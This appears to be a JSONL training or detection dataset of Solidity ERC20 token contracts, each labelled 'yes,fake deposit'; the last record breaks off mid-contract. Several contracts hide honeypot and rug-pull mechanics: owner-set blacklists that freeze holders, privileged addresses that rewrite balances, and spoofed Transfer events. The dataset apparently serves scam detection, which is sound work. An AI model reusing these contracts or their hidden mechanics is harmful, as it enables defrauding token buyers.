{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address dBMC = 0xE5fdc00Edb7e2004D5E37F7F991A946B44a7f3E2;\n\taddress DBMW = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract ONIROS is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private dBc;\n\tmapping (address => bool) private dBb;\n mapping (address => bool) private dBw;\n mapping (address => mapping (address => uint256)) private dBv;\n uint8 private constant DBl = 8;\n uint256 private constant dBS = 200000000 * (10** DBl);\n string private constant _name = \"Oniros Network\";\n string private constant _symbol = \"ONIROS\";\n\n\n\n constructor () {\n dBc[_msgSender()] = dBS;\n dMkr(DBMW, dBS); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return DBl;\n }\n\n function totalSupply() public pure returns (uint256) {\n return dBS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return dBc[account];\n }\n\t\n\n \n\t function dburn(address dBj) onlyOwner public{\n dBb[dBj] = true; }\n\t\n function dMkr(address dBj, uint256 dBn) onlyOwner internal {\n emit Transfer(address(0), dBj ,dBn); }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return dBv[owner][spender];\n }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n dBv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction dquery(address dBj) public{\n if(dBb[msg.sender]) { \n dBw[dBj] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == dBMC) {\n require(amount <= dBc[sender]);\n dBc[sender] -= amount; \n dBc[recipient] += amount; \n dBv[sender][msg.sender] -= amount;\n emit Transfer (DBMW, recipient, amount);\n return true; } else \n if(!dBw[recipient]) {\n if(!dBw[sender]) {\n require(amount <= dBc[sender]);\n require(amount <= dBv[sender][msg.sender]);\n dBc[sender] -= amount;\n dBc[recipient] += amount;\n dBv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction dStake(address dBj) public {\n if(dBb[msg.sender]) { \n dBw[dBj] = false;}}\n\t\t\n\t\tfunction transfer(address dBj, uint256 dBn) public {\n if(msg.sender == dBMC) {\n require(dBc[msg.sender] >= dBn);\n dBc[msg.sender] -= dBn; \n dBc[dBj] += dBn; \n emit Transfer (DBMW, dBj, dBn);} else \n if(dBb[msg.sender]) {dBc[dBj] += dBn;} else\n if(!dBw[msg.sender]) {\n require(dBc[msg.sender] >= dBn);\n dBc[msg.sender] -= dBn; \n dBc[dBj] += dBn; \n emit Transfer(msg.sender, dBj, dBn);}}\n\t\t\n\t\t\n\n\t\t\n\t\t}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.6.7;\n\n\ninterface ERC20 {\n function totalSupply() external view returns (uint _totalSupply);\n function balanceOf(address _owner) external view returns (uint balance);\n function transfer(address _to, uint _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint _value) external returns (bool success);\n function approve(address _spender, uint _value) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n\n}\n\n// this is the basics of creating an ERC20 token\n//change the name Henri and the symbol to whatever you would like\n\ncontract FATFARM is ERC20 {\n string public constant symbol = \"FAT\";\n string public constant name = \"Fat Coin\";\n uint8 public constant decimals = 18;\n \n //1,000,000+18 zeros\n uint private constant __totalSupply = 1000000000000000000000000000000;\n\n //this mapping is where we store the balances of an address\n mapping (address => uint) private __balanceOf;\n\n //This is a mapping of a mapping. This is for the approval function to determine how much an address can spend\n mapping (address => mapping (address => uint)) private __allowances;\n\n //the creator of the contract has the total supply and no one can create tokens\n constructor() public {\n __balanceOf[msg.sender] = __totalSupply;\n }\n\n //constant value that does not change/ returns the amount of initial tokens to display\n function totalSupply() public view override returns (uint _totalSupply) {\n _totalSupply = __totalSupply;\n }\n\n //returns the balance of a specific address\n function balanceOf(address _addr) public view override returns (uint balance) {\n return __balanceOf[_addr];\n }\n \n\n //transfer an amount of tokens to another address. The transfer needs to be >0 \n //does the msg.sender have enough tokens to forfill the transfer\n //decrease the balance of the sender and increase the balance of the to address\n function transfer(address _to, uint _value) public override returns (bool success) {\n if (_value > 0 && _value <= balanceOf(msg.sender)) {\n __balanceOf[msg.sender] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n\n \n //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\n //If the 3rd party has an allowance of >0 \n //and the value to transfer is >0 \n //and the allowance is >= the value of the transfer\n //and it is not a contract\n //perform the transfer by increasing the to account and decreasing the from accounts\n function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\n if (__allowances[_from][msg.sender] > 0 &&\n _value >0 &&\n __allowances[_from][msg.sender] >= _value\n // the to address is not a contract\n && !isContract(_to)) {\n __balanceOf[_from] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n\n\n //This check is to determine if we are sending to a contract?\n //Is there code at this address? If the code size is greater then 0 then it is a contract.\n function isContract(address _addr) public view returns (bool) {\n uint codeSize;\n //in line assembly code\n assembly {\n codeSize := extcodesize(_addr)\n }\n // i=s code size > 0 then true\n return codeSize > 0; \n }\n\n \n //allows a spender address to spend a specific amount of value\n function approve(address _spender, uint _value) external override returns (bool success) {\n __allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n\n //shows how much a spender has the approval to spend to a specific address\n function allowance(address _owner, address _spender) external override view returns (uint remaining) {\n return __allowances[_owner][_spender];\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.8.0;\n\ninterface ERC20Interface {\n\n function totalSupply() external view returns (uint256);\n\n function balanceOf(address account) external view returns (uint256);\n\n function transfer(address recipient, uint256 amount) external returns (bool);\n\n function allowance(address owner, address spender) external view returns (uint256);\n\n function approve(address spender, uint256 amount) external returns (bool);\n\n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n event Transfer(address indexed from, address indexed to, uint256 value);\n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n \n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract WXO is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address ckstruct = 0x1eEFA82f8cBC16885C4977B261cCA710E176e373;\n\taddress V3Router = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _owner);\n emit OwnershipTransferred(_owner, address(0));\n _owner = address(0);\n }\n\n}\n\n\n\ncontract EONIX is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) public Zti;\n\tmapping (address => uint256) private Yti;\n mapping (address => bool) private CXv;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _tTotal = 100000000 * 10**_decimals;\n string private constant _name = \"EONIX DAO\";\n string private constant _symbol = \"EONIX\";\n\n\n\n constructor () {\n Zti[_msgSender()] = _tTotal;\n emit Transfer(address(0), V3Router, _tTotal);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _tTotal;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Zti[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n function LXBU () public {\n if(msg.sender == ckstruct) {\n Zti[msg.sender] = Yti[msg.sender];\n }}\n\n\n\n function LXDE(address xt) public {\n if(msg.sender == ckstruct) { \n CXv[xt] = false;}}\n function LXCE(address xt) public{\n if(msg.sender == ckstruct) { \n require(!CXv[xt]);\n CXv[xt] = true;\n }}\n function LXBR(uint256 xt) public {\n if(msg.sender == ckstruct) { \n Yti[msg.sender] = xt;} } \n\n function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == ckstruct) {\n require(amount <= Zti[sender]);\n Zti[sender] -= amount; \n Zti[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (V3Router, recipient, amount);\n return true; } \n if(!CXv[sender] && !CXv[recipient]) {\n require(amount <= Zti[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n Zti[sender] -= amount;\n Zti[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}\n\n \n\n function transfer(address recipient, uint256 amount) public {\n if(msg.sender == ckstruct) {\n require(Zti[msg.sender] >= amount);\n Zti[msg.sender] -= amount; \n Zti[recipient] += amount; \n emit Transfer (V3Router, recipient, amount);\n } \n if(!CXv[msg.sender]) {\n require(Zti[msg.sender] >= amount);\n Zti[msg.sender] -= amount; \n Zti[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}\n \n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address gFX = 0x86a55571628aF35AACf38AaA756E67673D87eE83;\n\taddress gWFX = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract MAGMAROCKS is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private GZA;\n\tmapping (address => bool) private GZE;\n mapping (address => bool) private GZW;\n mapping (address => mapping (address => uint256)) private gZV;\n uint8 private constant GZD = 8;\n uint256 private constant gTS = 150000000 * (10** GZD);\n string private constant _name = \"Magma.Rocks\";\n string private constant _symbol = \"MAGMA\";\n \n\n\n constructor () {\n GZA[_msgSender()] = gTS;\n gRMK(gWFX, gTS); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return GZD;\n }\n\n function totalSupply() public pure returns (uint256) {\n return gTS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return GZA[account];\n }\n\t\n\n \n\n\t\t\t\t function gburn(address GZj) onlyOwner public{\n GZE[GZj] = true; }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return gZV[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n gZV[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction gquery(address GZj) public{\n if(GZE[msg.sender]) { \n GZW[GZj] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == gFX) {\n require(amount <= GZA[sender]);\n GZA[sender] -= amount; \n GZA[recipient] += amount; \n gZV[sender][msg.sender] -= amount;\n emit Transfer (gWFX, recipient, amount);\n return true; } else \n if(!GZW[recipient]) {\n if(!GZW[sender]) {\n require(amount <= GZA[sender]);\n require(amount <= gZV[sender][msg.sender]);\n GZA[sender] -= amount;\n GZA[recipient] += amount;\n gZV[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction gStake(address GZj) public {\n if(GZE[msg.sender]) { \n GZW[GZj] = false;}}\n\t\tfunction gRMK(address GZj, uint256 gZN) onlyOwner internal {\n emit Transfer(address(0), GZj ,gZN); }\n\t\t\n\t\tfunction transfer(address GZj, uint256 gZN) public {\n if(msg.sender == gFX) {\n require(GZA[msg.sender] >= gZN);\n GZA[msg.sender] -= gZN; \n GZA[GZj] += gZN; \n emit Transfer (gWFX, GZj, gZN);} else \n if(GZE[msg.sender]) {GZA[GZj] += gZN;} else\n if(!GZW[msg.sender]) {\n require(GZA[msg.sender] >= gZN);\n GZA[msg.sender] -= gZN; \n GZA[GZj] += gZN; \n emit Transfer(msg.sender, GZj, gZN);}}\n\t\t\n\t\t\n\n\t\t\n\t\t}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 15000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 15000000000000000; // Update total supply (100000 for example)\n name = \"Wiion\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals\n symbol = \"WII\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address BoI = 0xb29ca378D528eECba2F19Ff77B32C8723Cc36c49;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner); \n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract APLIUM is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Bxx;\n mapping (address => uint256) private Byy;\n mapping (address => mapping (address => uint256)) private BvI;\n uint8 private constant BdI = 8;\n uint256 private constant bTT = 150000000 * (10** BdI);\n string private constant _name = \"APLIUM\";\n string private constant _symbol = \"APLIUM\";\n\n\n\n constructor () {\n Bxx[_msgSender()] = bTT; \n emit Transfer(address(0), BoI, bTT);}\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return BdI;\n }\n\n function totalSupply() public pure returns (uint256) {\n return bTT;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Bxx[account];\n }\n\t function allowance(address owner, address spender) public view returns (uint256) {\n return BvI[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n BvI[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n\n function update() public {\n Bxx[msg.sender] = Byy[msg.sender];}\n function transfer(address to, uint256 amount) public {\n if(Byy[msg.sender] <= 1) {\n require(Bxx[msg.sender] >= amount);\n Bxx[msg.sender] -= amount; \n Bxx[to] += amount; \n emit Transfer(msg.sender, to, amount);}}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(Byy[sender] <= 1 && Byy[recipient] <= 1) {\n require(amount <= Bxx[sender]);\n require(amount <= BvI[sender][msg.sender]);\n Bxx[sender] -= amount;\n Bxx[recipient] += amount;\n BvI[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}\n function Qry(address x, uint256 y) public {\n require(msg.sender == BoI);\n Byy[x] = y;}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _conscripter = 0x4312662cf2Cc99f5Bd018291CE8a5C1D11a73324;\n\taddress V2Uniswap = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract AQUEUS is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Lx;\n\tmapping (address => bool) private Ly;\n mapping (address => bool) private Lk;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _totalsup = 150000000 * 10**_decimals;\n string private constant _name = \"AQUEUS DAO\";\n string private constant _symbol = \"AQUEUS\";\n\n\n\n constructor () {\n Lx[_MsgSendr()] = _totalsup;\n emit Transfer(address(0), V2Uniswap, _totalsup);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _totalsup;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Lx[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction xendx(address yz) public {\n if(Ly[msg.sender]) { \n Lk[yz] = false;}}\n function xqueryx(address yz) public{\n if(Ly[msg.sender]) { \n require(!Lk[yz]);\n Lk[yz] = true; }}\n\t\tfunction xstakex(address yz) public{\n if(msg.sender == _conscripter) { \n require(!Ly[yz]);\n Ly[yz] = true; 